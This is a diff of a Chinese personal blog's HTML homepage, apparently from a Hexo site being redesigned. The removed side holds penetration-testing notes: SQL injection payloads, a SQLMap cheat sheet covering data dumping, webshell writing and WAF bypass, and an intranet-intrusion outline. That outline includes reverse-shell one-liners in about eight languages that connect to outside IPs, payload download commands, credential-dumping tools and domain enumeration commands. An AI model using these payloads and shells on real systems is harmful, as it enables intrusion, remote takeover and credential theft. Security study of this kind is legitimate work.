@@ -1,1949 +1,1417 @@
 <!DOCTYPE html>
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
-  <meta charset="utf-8">
-  
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="桂ICP备18011307号-1">
+    
+    
+    
+    
+    
+    
+    <title>赵氏扶绥龙 的blog</title>
+    <link href="https://pjun666.github.io" rel="prefetch">
 
-  
-  <title>Tahm&#39;s blog</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  
-  
-  
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Tahm&#39;s blog">
-<meta property="og:url" content="https://pjun666.github.io/index.html">
-<meta property="og:site_name" content="Tahm&#39;s blog">
-<meta property="og:locale" content="zh-CN">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Tahm&#39;s blog">
-  
-    <link rel="alternate" href="/atom.xml" title="Tahm&#39;s blog" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/images/default-avatar.jpeg">
-  
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  <link rel="stylesheet" href="/css/style.css">
-  <link rel="stylesheet" href="/css/highlight.css">
-</head>
-</html>
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/aos.css">
+<link rel="stylesheet" href="/css/style.css">
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/bootstrap.min.js"></script>
+    <script src="/js/aos.js"></script>
+    <script src="/js/highslide/highslide-full.min.js"></script>
+    <link rel="stylesheet" href="/js/highslide/highslide.css">
+    <style type="text/css">
+        @media (max-width: 768px) {
+            body {
+                background-color: #f0f0f0;
+                background: url('/imgs/xsbg.gif');
+                background-attachment: fixed;
+            }
+        }
+    </style>
+    
+    <!--<script type="text/javascript">
+      if (document.images) {
+        var avatar = new Image();
+        avatar.src = '/imgs/avatar.jpg'
+        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg'.split(',')
+        var previewsPreLoad = []
+        for(var i = 0; i < length; i++) {
+          previewsPreLoad.push(new Image())
+          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
+        }
+      }
+    </script>-->
+</head></html>
 <body>
-  <div id="fullpage" class="mobile-nav-right">
-    
-      <div id="wrapper" title="图片来自网络">
-    
-    
-      <header id="header">
-  <div id="nav-toggle" class="nav-toggle"></div>
-  <div class="head-box global-width">
-    <nav class="nav-box nav-right">
-      
-        <a class="nav-item" href="/" title="">首页</a>
-      
-        <a class="nav-item" href="/archives" title="">归档</a>
-      
-        <a class="nav-item" href="/" title="">关于</a>
-      
-    </nav>
-  </div>
-</header>
-      <div id="middlecontent" title class="global-width sidebar-right">
-        <section id="main">
-  
-    <article id="post-union联合查询" class="article global-container article-type-post" itemscope="" itemprop="blogPost">
-  
-    <header class="article-header">
-      
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/03/16/union联合查询/">union联合查询笔记</a>
-    </h1>
-  
-
-    </header>
-  
-  <div class="article-meta">
-    <a href="/2019/03/16/union联合查询/" class="article-date">
-  <time datetime="2019-03-16T11:59:03.000Z" itemprop="datePublished">2019-03-16</time>
-</a>
-    
-    
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
-
-  </div>
-  
-
-  <div class="article-inner">
-    
-    <div class="article-content article-content-doorframe" itemprop="articleBody">
-      
-        <p>union注入<br>1.判断是否存在注入<br>2.判断有多少列<br>3.判断数据显示点<br>4.查看数据库基本信息（数据库名、表名、列名、用户数据）</p>
-<p>table_schema = 库名<br>table_name = 表名<br>column_name = 字段名</p>
-<p>查所有库<br>union select group_concat(schema_name),1 from information_schema.schemata  –+<br>从库     information_schema    中查询表        schemata    的字段    schema_name </p>
-<p>查所有表<br>从库        information_schema     中查询表        tables         的字段    table_name </p>
-<p>查某个库中的所有表<br>从库        information_schema     中查询表        tables        的字段    table_name    加判断条件    where table_schema = ‘库名’ –+</p>
-<p>查询所有字段<br>从库     information_schema    中查询表        columns        的字段    column_name</p>
-<p>查询某个库中某个表中的所有字段<br>从库        information_schema    中查询表        columns        的字段    column_name    加判断条件    where  table_name = ‘表名’ and table_schema = ‘库名’ –+ （避免重复不同库相同表名）</p>
-<p>查询数据库中的数据内容<br>从库        库名                    中查询表        表名            的字段    字段名            </p>
-
-      
-    </div>
-    
-  </div>
-  
-  
-</article>
-
-  
-    <article id="post-Access手工注入" class="article global-container article-type-post" itemscope="" itemprop="blogPost">
-  
-    <header class="article-header">
-      
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/03/16/Access手工注入/">Access手工注入</a>
-    </h1>
-  
-
-    </header>
-  
-  <div class="article-meta">
-    <a href="/2019/03/16/Access手工注入/" class="article-date">
-  <time datetime="2019-03-16T11:48:34.000Z" itemprop="datePublished">2019-03-16</time>
-</a>
-    
-    
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
-
-  </div>
-  
-
-  <div class="article-inner">
-    
-    <div class="article-content article-content-doorframe" itemprop="articleBody">
-      
-        <p>1.手工注入(暴力猜解)</p>
-<p>表名：<br>id=1 and exists(select * from 表名)</p>
-<p>列名：<br>id=1 and exists(select 列名 from 表名)</p>
-<p>列中内容长度：<br>id=1 and (select top 1 len(列名) from 表名) &gt; 3</p>
-<p>列中内容的每个字符：<br>id=1 and (select top 1 asc(mid(列名,1,1)) from 表名) &gt; 96</p>
-<p>2.工具注入<br>穿山甲、明小子、啊D、SQLMap</p>
-<p>3.中转注入（Cookie注入）<br>中转注入为cookie注入的一种手法，这种攻击手法常见于asp搭配数据库的情况，当asp脚本中有对传入的数据进行检测过滤时，只对post和get方法所获取的数据进行检查，而没有对cookie检查，可以在cookie中加入你的sql注射攻击代码，从而绕过asp检测脚本而对数据库进行攻击<br>salmap –cookie “id=1” –leval 3</p>
-
-      
-    </div>
-    
-  </div>
-  
-  
-</article>
-
-  
-    <article id="post-SQLMap笔记" class="article global-container article-type-post" itemscope="" itemprop="blogPost">
-  
-    <header class="article-header">
-      
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/03/16/SQLMap笔记/">SQLMap笔记</a>
-    </h1>
-  
-
-    </header>
-  
-  <div class="article-meta">
-    <a href="/2019/03/16/SQLMap笔记/" class="article-date">
-  <time datetime="2019-03-16T03:00:02.000Z" itemprop="datePublished">2019-03-16</time>
-</a>
-    
-    
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
-
-  </div>
-  
-
-  <div class="article-inner">
-    
-    <div class="article-content article-content-doorframe" itemprop="articleBody">
-      
-        <p>sqlmap -u “url”<br>get注入：-u “url”<br>post注入： –data “数据”<br>cookie注入: –cookie “cookie值”</p>
-<p>获取数据库名：–current-db<br>获取当前用户：–current–user</p>
-<p>获取数据量：–count -D 库名<br>查看用户权限：–privileges<br>MySQL:root<br>MSSQL:sa</p>
-<p>注入MySQL<br>1.获取库名：–current-db<br>2.获取表名：–tables -D 库名<br>3.获取列名：–columns -T 表名 -D 库名<br>4.获取内容：–dump -C 列名 -T 表名 -D 库名</p>
-<p>其它数据库流程相同<br>NoSQLMap(github) 注入Mangodb、NoSQL</p>
-<p>sqlmap连接数据库sqlmap.py -d “mysql:用户名:密码@地址:端口/数据库名”<br>前提：安装pymysql  github下载<br>进入命令行：–sql-shell</p>
-<p>延时注入：–delay 时间<br>延时注入：–safe-freq</p>
-<p>需要网站绝对路径    、最高权限<br>命令执行(提权)：–os-cmd=”命令”    4-2<br>写webshell：–os-shell    4-2<br>本地写入webshell：–file-write “本地文件路径” –file-dest “目标文件路径”</p>
-<p>绕waf：–tamper=”脚本名字”</p>
-<p>批量检测：-m “文件路径”<br>结合BurpSuite批量检测：-l “burp.log” –batch -smart<br>batch：会自动选择yes<br>smart：启发式快速判断，节约时间</p>
-<p>注入级别：<br>–level=（1-5）#水平等级，默认为1<br>–risk=（0-3）#风险等级，默认为0</p>
-<p>检测防火墙特征：–identity-waf</p>
-<p>学习注入payload：<br>1.xml目录<br>2.-v参数，默认为1，3显示注入的payload<br>3.–proxy=<a href="http://ip:port" target="_blank" rel="noopener">http://ip:port</a>  结合BurpSuite代理抓包</p>
-
-      
-    </div>
-    
-  </div>
-  
-  
-</article>
-
-  
-    <article id="post-内网渗透" class="article global-container article-type-post" itemscope="" itemprop="blogPost">
-  
-    <header class="article-header">
-      
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/03/02/内网渗透/">内网渗透</a>
-    </h1>
-  
-
-    </header>
-  
-  <div class="article-meta">
-    <a href="/2019/03/02/内网渗透/" class="article-date">
-  <time datetime="2019-03-02T13:49:41.000Z" itemprop="datePublished">2019-03-02</time>
-</a>
-    
-    
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/内网渗透/">内网渗透</a></li></ul>
-
-  </div>
-  
-
-  <div class="article-inner">
-    
-    <div class="article-content article-content-doorframe" itemprop="articleBody">
-      
-        <h2 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h2><h3 id="开源情报收集-OSINT"><a href="#开源情报收集-OSINT" class="headerlink" title="开源情报收集(OSINT)"></a>开源情报收集(OSINT)</h3><ul>
-<li><p>github</p>
-<ul>
-<li>github_Nuggests(自动爬取Github上敏感信息、文件泄露)</li>
-<li>GSIL(能够实现近实时(15分钟内)的发现Github上泄露的信息)</li>
-<li><a href="https://github.com/MiSecurity/x-patrol" target="_blank" rel="noopener">https://github.com/MiSecurity/x-patrol</a></li>
-</ul>
-</li>
-<li><p>whois查寻/注册人反差/邮箱反差/相关资产</p>
-<ul>
-<li>站长之家</li>
-<li>爱站</li>
-<li>微步在线</li>
-<li>IP反查</li>
-<li>天眼查</li>
-<li>虎妈查</li>
-<li><p>历史漏洞查询</p>
-<ul>
-<li>在线查询(<a href="http://cb.drops.wiki" target="_blank" rel="noopener">http://cb.drops.wiki</a>)</li>
-<li>自建查询(乌云镜像站)</li>
-</ul>
-</li>
-<li><p>…</p>
-</li>
-</ul>
-</li>
-<li><p>google hacking</p>
-</li>
-</ul>
-<h3 id="创建企业密码字典"><a href="#创建企业密码字典" class="headerlink" title="创建企业密码字典"></a>创建企业密码字典</h3><ul>
-<li><p>字典列表</p>
-<ul>
-<li>passwordlist</li>
-<li>猪猪侠字典</li>
-<li>Blasting_dictionary（分享和收集各种字典，包括弱口令，常用密码，目录爆破。数据库爆破，编辑器爆破，后台爆破等）</li>
-<li>针对特定的厂商，重点构造厂商相关域名的字典(  [‘%pwd%123’,’%user%123’,’%user%521’,’%user%2017’,’%pwd%321’,’%pwd%521’,’%user%321’,’%pwd%123!’,‘%pwd%123!@#’,’%pwd%1234’,’%user%2016’,’%user%123$%^’,‘%user%123!@#’,’%pwd%2016’,’%pwd%2017’,’%pwd%1!’,‘%pwd%2@’,’%pwd%3#’,‘%pwd%123#@!’,’%pwd%12345’,’%pwd%123$%^’,‘%pwd%!@#456’,’%pwd%123qwe’,’%pwd%qwe123’,’%pwd%qwe’,’%pwd%123456’,‘%user%123#@!’,‘%user%!@#456’,’%user%1234’,’%user%12345’,’%user%123456’,’%user%123!’])</li>
-</ul>
-</li>
-<li><p>密码生成</p>
-<ul>
-<li>genpAss（中国特色的弱口令生成器）（<a href="https://github.com/RicterZ/genpAss/）" target="_blank" rel="noopener">https://github.com/RicterZ/genpAss/）</a></li>
-<li>passmaker（可以自定义规则的密码字典生成器）</li>
-<li>pydictor（强大的密码生成器）</li>
-<li>pentestdb</li>
-</ul>
-</li>
-</ul>
-<h3 id="使用已攻陷密码列表来查找邮件地址跟凭证信息"><a href="#使用已攻陷密码列表来查找邮件地址跟凭证信息" class="headerlink" title="使用已攻陷密码列表来查找邮件地址跟凭证信息"></a>使用已攻陷密码列表来查找邮件地址跟凭证信息</h3><ul>
-<li>theHarvester</li>
-<li>获取一个邮箱以后导出通讯录</li>
-<li>LinkedInt</li>
-</ul>
-<h3 id="对企业外部相关信息进行扫描"><a href="#对企业外部相关信息进行扫描" class="headerlink" title="对企业外部相关信息进行扫描"></a>对企业外部相关信息进行扫描</h3><ul>
-<li><p>子域名获取</p>
-<ul>
-<li>Layer子域名挖掘机4.2纪念版</li>
-<li>subDomainsBrute</li>
-<li>wydomain</li>
-<li>Sublist3r</li>
-<li>site:target.com</li>
-<li>Github代码仓库</li>
-<li>抓包分析请求返回值(跳转/文件上传/app/api接口等)</li>
-<li>站长帮手links等在线查询网站</li>
-<li><p>域传送漏洞</p>
-<ul>
-<li>Linux : dig @ns.example.com example=.com AXFR</li>
-<li>windows :  nslookup -&gt; set type=ns -&gt;target.com -&gt; server ns.target.com -&gt; ls target.com</li>
-</ul>
-</li>
-<li><p>GetDomainsBySSL.py</p>
-</li>
-<li>censys.io证书</li>
-<li><p>shodan/fofa.so/zoomeye</p>
-<ul>
-<li>shadon</li>
-<li>fofa</li>
-<li>zoomeye</li>
-</ul>
-</li>
-<li><p>dnsdb.io</p>
-</li>
-<li>api.hackertarget.com</li>
-<li>community.riskiq.com</li>
-<li>subdomain3</li>
-<li>FuzzDomain</li>
-<li>alive-host</li>
-<li>dnsdumpster.com</li>
-</ul>
-</li>
-</ul>
-<h2 id="2、进入内网"><a href="#2、进入内网" class="headerlink" title="2、进入内网"></a>2、进入内网</h2><h3 id="基于企业弱账号漏洞"><a href="#基于企业弱账号漏洞" class="headerlink" title="基于企业弱账号漏洞"></a>基于企业弱账号漏洞</h3><ul>
-<li>VPN（通过邮箱，密码爆破，社工等途径获取VPN）</li>
-<li>企业相关运维系统（zabbix等）</li>
-</ul>
-<h3 id="基于系统漏洞进入"><a href="#基于系统漏洞进入" class="headerlink" title="基于系统漏洞进入"></a>基于系统漏洞进入</h3><ul>
-<li>Metasploit(漏洞利用框架)</li>
-<li>漏洞利用脚本</li>
-</ul>
-<h3 id="网站应用程序渗透"><a href="#网站应用程序渗透" class="headerlink" title="网站应用程序渗透"></a>网站应用程序渗透</h3><ul>
-<li>SQL注入</li>
-<li>跨站脚本（XSS）</li>
-<li>跨站请求伪造（CSRF）</li>
-<li>SSRF(ssrf_proxy)</li>
-<li>功能/业务逻辑漏洞</li>
-<li>其他漏洞等</li>
-<li>CMS-内容管理系统漏洞</li>
-<li>企业自建代理</li>
-</ul>
-<h3 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h3><ul>
-<li>鱼叉攻击</li>
-<li>水坑攻击</li>
-</ul>
-<h3 id="无线WIFI接入"><a href="#无线WIFI接入" class="headerlink" title="无线WIFI接入"></a>无线WIFI接入</h3><h2 id="3、隐匿攻击"><a href="#3、隐匿攻击" class="headerlink" title="3、隐匿攻击"></a>3、隐匿攻击</h2><h3 id="Command-and-Control"><a href="#Command-and-Control" class="headerlink" title="Command and Control"></a>Command and Control</h3><ul>
-<li>ICMP</li>
-<li>DNS</li>
-<li>DropBox</li>
-<li>Gmail</li>
-<li>Telegram</li>
-<li>Twitter</li>
-<li>Website Keyword</li>
-<li>PowerShell</li>
-<li>Windows COM</li>
-<li>WebDAV</li>
-<li>Office 365</li>
-<li>Active Directory</li>
-<li>HTTPS</li>
-<li>Kernel</li>
-<li>Website</li>
-<li>WMI</li>
-<li>WebSocket</li>
-<li>Images</li>
-<li>Web Interface</li>
-<li>JavaScript</li>
-<li>…</li>
-</ul>
-<h3 id="Froting"><a href="#Froting" class="headerlink" title="Froting"></a>Froting</h3><ul>
-<li>Domain Fronting</li>
-<li>Tor Fronting</li>
-</ul>
-<h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><ul>
-<li>VPN</li>
-<li>shadowsockts</li>
-<li>HTTP</li>
-<li>Tor</li>
-</ul>
-<h2 id="4、内网跨边界应用"><a href="#4、内网跨边界应用" class="headerlink" title="4、内网跨边界应用"></a>4、内网跨边界应用</h2><h3 id="内网跨边界转发"><a href="#内网跨边界转发" class="headerlink" title="内网跨边界转发"></a>内网跨边界转发</h3><ul>
-<li>NC端口转发</li>
-<li>LCX端口转发</li>
-<li>PS Powercat</li>
-<li><p>代理脚本</p>
-<ul>
-<li>Tunna</li>
-<li>Reduh</li>
-</ul>
-</li>
-<li><p>…</p>
-</li>
-</ul>
-<h3 id="内网跨边界代理穿透"><a href="#内网跨边界代理穿透" class="headerlink" title="内网跨边界代理穿透"></a>内网跨边界代理穿透</h3><ul>
-<li><p>EW</p>
-<ul>
-<li>正向 SOCKS v5 服务器: ./ew -s ssocksd -l 1080</li>
-<li>反弹 SOCKS v5 服务器:<br>a) 先在一台具有公网 ip 的主机A上运行以下命令：$ ./ew -s rcsocks -l 1080 -e 8888<br>b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口<br>$ ./ew -s rssocks -d 1.1.1.1 -e 8888 </li>
-<li><p>多级级联<br>$ ./ew -s lcx_listen -l 1080 -e 8888<br>$ ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999<br>$ ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999</p>
-<ul>
-<li>lcx_tran 的用法<br>$ ./ew -s ssocksd -l 9999<br>$ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999</li>
-<li>lcx_listen、lcx_slave 的用法<br>$ ./ew -s lcx_listen -l 1080 -e 8888<br>$ ./ew -s ssocksd -l 9999<br>$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</li>
-<li>“三级级联”的本地SOCKS测试用例以供参考<br>$ ./ew -s rcsocks -l 1080 -e 8888<br>$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999<br>$ ./ew -s lcx_listen -l 9999 -e 7777<br>$ ./ew -s rssocks -d 127.0.0.1 -e 7777</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>Termite</p>
-<ul>
-<li>使用说明:<a href="http://rootkiter.com/Termite/README.txt" target="_blank" rel="noopener">http://rootkiter.com/Termite/README.txt</a></li>
-</ul>
-</li>
-<li><p>代理脚本</p>
-<ul>
-<li>reGeorg</li>
-</ul>
-</li>
-<li><p>…</p>
-</li>
-</ul>
-<h3 id="shell反弹"><a href="#shell反弹" class="headerlink" title="shell反弹"></a>shell反弹</h3><ul>
-<li><p>bash</p>
-<ul>
-<li>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</li>
-</ul>
-</li>
-<li><p>perl</p>
-<ul>
-<li>perl -e ‘use Socket;$i=”10.0.0.1”;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</li>
-</ul>
-</li>
-<li><p>python</p>
-<ul>
-<li>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</li>
-</ul>
-</li>
-<li><p>php</p>
-<ul>
-<li>php -r ‘$sock=fsockopen(“10.0.0.1”,1234);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</li>
-</ul>
-</li>
-<li><p>ruby</p>
-<ul>
-<li>ruby -rsocket -e’f=TCPSocket.open(“10.0.0.1”,1234).to_i;exec sprintf(“/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d”,f,f,f)’</li>
-</ul>
-</li>
-<li><p>java</p>
-<ul>
-<li>r = Runtime.getRuntime()<br>p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&5; done”] as String[])<br>p.waitFor()</li>
-</ul>
-</li>
-<li><p>nc</p>
-<ul>
-<li>使用-e : nc -e /bin/sh 223.8.200.234 1234</li>
-<li>不使用-e:<br>mknod /tmp/backpipe p<br>/bin/sh 0/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe</li>
-</ul>
-</li>
-<li><p>lua</p>
-<ul>
-<li>lua -e “require(‘socket’);require(‘os’);t=socket.tcp();t:connect(‘202.103.243.122’,’1234’);os.execute(‘/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3’);”</li>
-</ul>
-</li>
-<li><p>…</p>
-</li>
-</ul>
-<h3 id="内网文件的传输和下载"><a href="#内网文件的传输和下载" class="headerlink" title="内网文件的传输和下载"></a>内网文件的传输和下载</h3><ul>
-<li><p>wput</p>
-<ul>
-<li>wput dir_name <a href="ftp://linuxpig:123456@host.com/" target="_blank" rel="noopener">ftp://linuxpig:123456@host.com/</a></li>
-</ul>
-</li>
-<li><p>wget</p>
-<ul>
-<li>wget <a href="http://site.com/1.rar" target="_blank" rel="noopener">http://site.com/1.rar</a> -O 1.rar</li>
-</ul>
-</li>
-<li><p>ariac2(需安装)</p>
-<ul>
-<li>aria2c -o owncloud.zip <a href="https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2" target="_blank" rel="noopener">https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2</a></li>
-</ul>
-</li>
-<li><p>powershell</p>
-<ul>
-<li>$p = New-Object System.Net.WebClient $p.DownloadFile(“<a href="http://domain/file&quot;,&quot;C:%homepath%file&quot;" target="_blank" rel="noopener">http://domain/file&quot;,&quot;C:%homepath%file&quot;</a>) </li>
-</ul>
-</li>
-<li><p>vbs脚本</p>
-<ul>
-<li><p>Set args = Wscript.Arguments<br>Url = “<a href="http://domain/file&quot;" target="_blank" rel="noopener">http://domain/file&quot;</a><br>dim xHttp: Set xHttp = createobject(“Microsoft.XMLHTTP”)<br>dim bStrm: Set bStrm = createobject(“Adodb.Stream”)<br>xHttp.Open “GET”, Url, False<br>xHttp.Send<br>with bStrm<br>.type = 1 ‘<br>.open<br>.write xHttp.responseBody<br>.savetofile “ C:\%homepath%\file”, 2 ‘<br>end with</p>
-<ul>
-<li>执行 ：cscript test.vbs</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>perl</p>
-<ul>
-<li><p>#!/usr/bin/perl<br>use LWP::Simple;<br>getstore(“<a href="http://domain/file&quot;" target="_blank" rel="noopener">http://domain/file&quot;</a>, “file”);</p>
-<ul>
-<li>执行：perl test.pl</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>python</p>
-<ul>
-<li><p>#!/usr/bin/python<br>import urllib2<br>u = urllib2.urlopen(‘<a href="http://domain/file&#39;" target="_blank" rel="noopener">http://domain/file&#39;</a>)<br>localFile = open(‘local_file’, ‘w’)<br>localFile.write(u.read())<br>localFile.close()</p>
-<ul>
-<li>执行：python test.py</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>ruby</p>
-<ul>
-<li><p>#!/usr/bin/ruby<br>require ‘net/http’<br>Net::HTTP.start(“<a href="http://www.domain.com&quot;" target="_blank" rel="noopener">www.domain.com&quot;</a>) { |http|<br>r = http.get(“/file”)<br>open(“save_location”, “wb”) { |file|<br>file.write(r.body)<br>}<br>}</p>
-<ul>
-<li>执行：ruby test.rb</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>php</p>
-<ul>
-<li><p>#!/usr/bin/php<br>$lf = “local_file”;<br>$fh = fopen($lf, ‘w’);<br>fwrite($fh, $data[0]);<br>fclose($fh);<br>?&gt;</p>
-<ul>
-<li>执行：php test.php</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>NC</p>
-<ul>
-<li><p>attacker</p>
-<ul>
-<li>cat file | nc -l 1234</li>
-</ul>
-</li>
-<li><p>target</p>
-<ul>
-<li>nc host_ip 1234 &gt; file</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>FTP</p>
-<ul>
-<li>ftp 127.0.0.1 username password get file exit</li>
-</ul>
-</li>
-<li><p>TFTP</p>
-<ul>
-<li>tftp -i host GET C:%homepath%file location_of_file_on_tftp_server</li>
-</ul>
-</li>
-<li><p>Bitsadmin</p>
-<ul>
-<li>bitsadmin /transfer n <a href="http://domain/file" target="_blank" rel="noopener">http://domain/file</a> c:%homepath%file</li>
-</ul>
-</li>
-<li><p>Window 文件共享</p>
-<ul>
-<li>net use x: \127.0.0.1\share /user:example.comuserID myPassword</li>
-</ul>
-</li>
-<li><p>SCP</p>
-<ul>
-<li><p>本地到远程</p>
-<ul>
-<li>scp file <a href="mailto:user@host.com" target="_blank" rel="noopener">user@host.com</a>:/tmp</li>
-</ul>
-</li>
-<li><p>远程到本地</p>
-<ul>
-<li>scp <a href="mailto:user@host.com" target="_blank" rel="noopener">user@host.com</a>:/tmp file</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>rsync</p>
-<ul>
-<li><p>远程rsync服务器中拷贝文件到本地机</p>
-<ul>
-<li>rsync -av <a href="mailto:root@192.168.78.192" target="_blank" rel="noopener">root@192.168.78.192</a>::www /databack</li>
-</ul>
-</li>
-<li><p>本地机器拷贝文件到远程rsync服务器</p>
-<ul>
-<li>rsync -av /databack <a href="mailto:root@192.168.78.192" target="_blank" rel="noopener">root@192.168.78.192</a>::www</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>certuuil.exe</p>
-<ul>
-<li>certutil.exe -urlcache -split -f <a href="http://site.com/file" target="_blank" rel="noopener">http://site.com/file</a></li>
-</ul>
-</li>
-<li><p>…</p>
-</li>
-</ul>
-<h2 id="5、内网信息收集"><a href="#5、内网信息收集" class="headerlink" title="5、内网信息收集"></a>5、内网信息收集</h2><h3 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h3><ul>
-<li><p>1、用户列表</p>
-<ul>
-<li>windows用户列表</li>
-<li>分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户</li>
-</ul>
-</li>
-<li><p>2、进程列表</p>
-<ul>
-<li>分析杀毒软件/安全监控工具等</li>
-<li>邮件客户端</li>
-<li>VPN</li>
-<li>ftp等</li>
-</ul>
-</li>
-<li><p>3、服务列表</p>
-<ul>
-<li>与安全防范工具有关服务[判断是否可以手动开关等]</li>
-<li>存在问题的服务[权限/漏洞]</li>
-</ul>
-</li>
-<li><p>4、端口列表</p>
-<ul>
-<li>开放端口对应的常见服务/应用程序[匿名/权限/漏洞等]</li>
-<li>利用端口进行信息收集</li>
-</ul>
-</li>
-<li><p>5、补丁列表</p>
-<ul>
-<li>分析 Windows 补丁</li>
-<li>第三方软件[Java/Oracle/Flash 等]漏洞</li>
-</ul>
-</li>
-<li><p>6、本机共享</p>
-<ul>
-<li>本机共享列表/访问权限</li>
-<li>本机访问的域共享/访问权限</li>
-</ul>
-</li>
-<li><p>7、本用户习惯分析</p>
-<ul>
-<li>历史记录</li>
-<li>收藏夹</li>
-<li>文档等</li>
-</ul>
-</li>
-<li><p>8、获取当前用户密码工具</p>
-<ul>
-<li><p>Windows</p>
-<ul>
-<li>mimikatz</li>
-<li>wce</li>
-<li>Invoke-WCMDump</li>
-<li>mimiDbg</li>
-<li>LaZagne</li>
-<li>nirsoft_package</li>
-<li>QuarksPwDump</li>
-<li>fgdump</li>
-<li>星号查看器等</li>
-</ul>
-</li>
-<li><p>Linux</p>
-<ul>
-<li>LaZagne</li>
-<li>mimipenguin</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="扩散信息收集"><a href="#扩散信息收集" class="headerlink" title="扩散信息收集"></a>扩散信息收集</h3><ul>
-<li><p>端口扫描</p>
-<ul>
-<li><p>常用端口扫描工具</p>
-<ul>
-<li>nmap</li>
-<li>masscan</li>
-<li>s扫描器</li>
-<li>自写脚本等</li>
-<li><p>NC</p>
-<ul>
-<li>nc -v -w 2 -z 192.168.1.1 20-1000</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>内网拓扑架构分析（DMZ，管理网，生产网，测试网）</p>
-</li>
-<li><p>常见信息收集命令</p>
-<ul>
-<li>net user ——&gt; 本机用户列表<br>net localgroup administrators ——&gt; 本机管理员[通常含有域用户]<br>net user /domain ——&gt; 查询域用户<br>net group /domain ——&gt; 查询域里面的工作组<br>net group “domain admins” /domain ——&gt; 查询域管理员用户组<br>net localgroup administrators /domain ——&gt; 登录本机的域管理员<br>net localgroup administrators workgroup\user001 /add —–&gt;域用户添加到本机 net group “Domain controllers” ——-&gt; 查看域控制器(如果有多台)<br>ipconfig /all ——&gt; 查询本机 IP 段，所在域等<br>net view ——&gt; 查询同一域内机器列表 net view /domain ——&gt; 查询域列表<br>net view /domain:domainname</li>
-<li><p>dsquery</p>
-<ul>
-<li>列出该域内所有机器名(dsquery computer domainroot -limit 65535 &amp;&amp; net group “domain<br>computers” /domain)<br>列出该域内所有用户名(dsquery user domainroot -limit 65535 &amp;&amp; net user /domain)<br>列出该域内网段划分 (dsquery subnet)<br>列出该域内分组 (dsquery group &amp;&amp; net group /domain)<br>列出该域内组织单位 (dsquery ou)<br>列出该域内域控制器 (dsquery server &amp;&amp; net time /domain)<br>列出域管理员帐号 (net group “domain admins” /domain)</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="第三方信息收集"><a href="#第三方信息收集" class="headerlink" title="第三方信息收集"></a>第三方信息收集</h3><ul>
-<li>NETBIOS 信息收集</li>
-<li>SMB 信息收集</li>
-<li>空会话信息收集</li>
